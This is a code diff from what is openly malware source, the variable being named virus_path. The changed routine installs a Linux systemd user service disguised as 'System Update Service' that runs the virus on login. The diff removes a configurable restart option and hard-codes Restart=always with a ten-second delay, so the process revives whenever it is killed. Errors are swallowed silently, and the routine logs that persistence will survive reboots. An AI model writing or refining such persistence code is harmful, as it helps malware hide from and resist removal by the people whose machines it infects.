@@ -68,13 +68,6 @@ X-GNOME-Autostart-enabled=true
             os.makedirs(systemd_dir, exist_ok=True)
             
             service_file = f"{systemd_dir}/system-update.service"
-            
-            # Configure restart behavior based on config
-            if PERSISTENCE_AUTO_RESTART:
-                restart_line = f"Restart=always\nRestartSec={PERSISTENCE_RESTART_SEC}"
-            else:
-                restart_line = "Restart=no  # Auto-restart disabled"
-            
             service_content = f"""[Unit]
 Description=System Update Service
 After=graphical-session.target
@@ -82,7 +75,8 @@ After=graphical-session.target
 [Service]
 Type=simple
 ExecStart=/usr/bin/python3 {virus_path}
-{restart_line}
+Restart=always
+RestartSec=10
 
 [Install]
 WantedBy=default.target
@@ -95,10 +89,7 @@ WantedBy=default.target
         except:
             pass
         
-        if PERSISTENCE_AUTO_RESTART:
-            log_activity("PERSISTENCE", f"Persistence installed - will survive reboots and auto-restart every {PERSISTENCE_RESTART_SEC}s if killed")
-        else:
-            log_activity("PERSISTENCE", "Persistence installed - will survive reboots (auto-restart disabled)")
+        log_activity("PERSISTENCE", "Persistence installed - will survive reboots")
     except:
         pass
 
